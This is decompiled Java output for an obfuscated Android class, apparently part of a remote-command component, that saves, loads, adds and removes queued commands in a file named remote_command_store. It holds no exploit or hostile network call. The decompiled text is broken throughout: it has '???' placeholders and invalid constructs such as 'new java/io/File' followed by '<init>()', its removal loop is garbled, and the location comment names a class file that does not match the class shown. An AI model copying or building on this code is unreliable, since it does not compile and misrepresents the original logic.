package com.vvt.remotecommand;

import com.vvt.io.q;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;

public class c
{
  private RemoteCommandList a;
  private String b;
  
  public c(String paramString)
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = paramString;
    arrayOfObject[1] = "remote_command_store";
    Object localObject = String.format("%s/%s", arrayOfObject);
    this.b = ((String)localObject);
    localObject = new com/vvt/remotecommand/RemoteCommandList;
    ((RemoteCommandList)localObject).<init>();
    this.a = ((RemoteCommandList)localObject);
  }
  
  public ArrayList a()
  {
    return this.a.getList();
  }
  
  void a(RemoteCommandList paramRemoteCommandList)
  {
    String str = this.b;
    q.a(paramRemoteCommandList, str);
  }
  
  boolean a(RemoteCommand paramRemoteCommand)
  {
    boolean bool = false;
    Object localObject1 = null;
    if (paramRemoteCommand != null)
    {
      ??? = paramRemoteCommand.getCode();
      if (??? == null) {}
    }
    synchronized (this.a)
    {
      localObject1 = this.a;
      localObject1 = ((RemoteCommandList)localObject1).getList();
      bool = ((ArrayList)localObject1).add(paramRemoteCommand);
      if (bool)
      {
        RemoteCommandList localRemoteCommandList = this.a;
        a(localRemoteCommandList);
      }
      return bool;
    }
  }
  
  boolean a(String paramString)
  {
    if (paramString != null) {}
    synchronized (this.a)
    {
      Object localObject1 = this.a;
      ArrayList localArrayList = ((RemoteCommandList)localObject1).getList();
      int i = 0;
      int j = localArrayList.size();
      if (i < j)
      {
        localObject1 = localArrayList.get(i);
        localObject1 = (RemoteCommand)localObject1;
        localObject1 = ((RemoteCommand)localObject1).getCode();
        boolean bool = paramString.equals(localObject1);
        if (bool) {
          localArrayList.remove(i);
        }
      }
      else
      {
        localObject1 = this.a;
        a((RemoteCommandList)localObject1);
        return false;
      }
      int k = i + 1;
      i = k;
    }
  }
  
  public void b()
  {
    Object localObject = d();
    if (localObject != null)
    {
      ArrayList localArrayList = ((RemoteCommandList)localObject).getList();
      if (localArrayList != null)
      {
        localArrayList = ((RemoteCommandList)localObject).getList();
        boolean bool = localArrayList.isEmpty();
        if (!bool)
        {
          localArrayList = this.a.getList();
          localObject = ((RemoteCommandList)localObject).getList();
          localArrayList.addAll((Collection)localObject);
        }
      }
    }
  }
  
  public boolean c()
  {
    File localFile = new java/io/File;
    String str = this.b;
    localFile.<init>(str);
    return localFile.delete();
  }
  
  RemoteCommandList d()
  {
    Object localObject = q.a(this.b);
    if (localObject != null)
    {
      boolean bool = localObject instanceof RemoteCommandList;
      if (!bool) {}
    }
    for (localObject = (RemoteCommandList)localObject;; localObject = null) {
      return (RemoteCommandList)localObject;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */